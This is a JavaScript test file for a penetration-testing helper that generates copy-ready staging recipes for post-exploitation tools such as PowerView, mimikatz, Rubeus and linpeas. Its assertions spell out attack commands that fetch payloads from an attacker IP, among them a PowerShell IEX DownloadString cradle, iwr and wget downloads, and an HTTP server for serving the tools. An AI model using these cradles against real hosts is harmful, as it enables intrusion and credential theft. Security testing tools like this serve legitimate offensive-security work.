/* Tool staging: on-host commands assume the tool is already on the box and loaded, but no command says how
 * to get it there. OBOL.stagingFor() maps a command's tool to a serve->fetch->load recipe, and
 * renderToolStaging() emits a copy-ready block with the attacker IP filled. Locks the catalog, the matching
 * (including PowerView cmdlet aliases), the reflective-vs-disk modes, and that remote tools get no staging. */
'use strict';
require('../../assets/engine/facts.js');
require('../../assets/engine/pack.js');
require('../../data/tool-staging.js');
const OBOL = globalThis.OBOL;

let fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

// 1. Matching: tool name, filename stems, and PowerView cmdlet aliases all resolve.
ok(OBOL.stagingFor('powerview') && OBOL.stagingFor('powerview').name === 'PowerView', 'powerview resolves');
ok(OBOL.stagingFor('winPEASx64.exe') && OBOL.stagingFor('winPEASx64.exe').name === 'winPEAS', 'winPEASx64.exe stem resolves to winPEAS');
ok(OBOL.stagingFor('linpeas.sh') && OBOL.stagingFor('linpeas.sh').os === 'linux', 'linpeas.sh resolves (linux)');
ok(OBOL.stagingFor('Get-DomainUser') && OBOL.stagingFor('Get-DomainUser').name === 'PowerView', 'a PowerView cmdlet alias resolves to PowerView');
ok(!OBOL.stagingFor('nxc') && !OBOL.stagingFor('nmap') && !OBOL.stagingFor(''), 'a remote tool (nxc/nmap) and empty get no staging recipe');

// 2. Reflective load (ps-iex): no file on disk, uses the download cradle; disk mode writes + loads.
const pv = OBOL.renderToolStaging(OBOL.stagingFor('powerview'), { lhost: '10.10.14.9' });
ok(/DownloadString\('http:\/\/10\.10\.14\.9\/PowerView\.ps1'\)/.test(pv), 'PowerView uses the IEX cradle with the filled attacker IP');
ok(/python3 -m http\.server 80/.test(pv), 'the recipe serves the file from Kali');
ok(/Get PowerView onto the host/.test(pv), 'the block is titled for the tool');

const wp = OBOL.renderToolStaging(OBOL.stagingFor('winpeas'), { lhost: '10.10.14.9' });
ok(/iwr http:\/\/10\.10\.14\.9\/winPEASx64\.exe/.test(wp), 'a Windows binary downloads to disk with iwr');
const lp = OBOL.renderToolStaging(OBOL.stagingFor('linpeas'), {});
ok(/wget http:\/\/\{\{lhost\}\}\/linpeas\.sh/.test(lp) && /chmod \+x/.test(lp), 'a linux script uses wget + chmod, and falls back to the {{lhost}} token when no IP is set');

// 3. Catalog breadth: the common on-host privesc/AD tools are covered.
['powerview', 'sharphound', 'mimikatz', 'rubeus', 'winpeas', 'linpeas', 'godpotato', 'accesschk'].forEach((t) => {
  ok(!!OBOL.stagingFor(t), 'catalog covers ' + t);
});

console.log(fail ? ('\nTOOL STAGING: ' + fail + ' FAILURES') : '\nTOOL STAGING: all passed');
process.exit(fail ? 1 : 0);
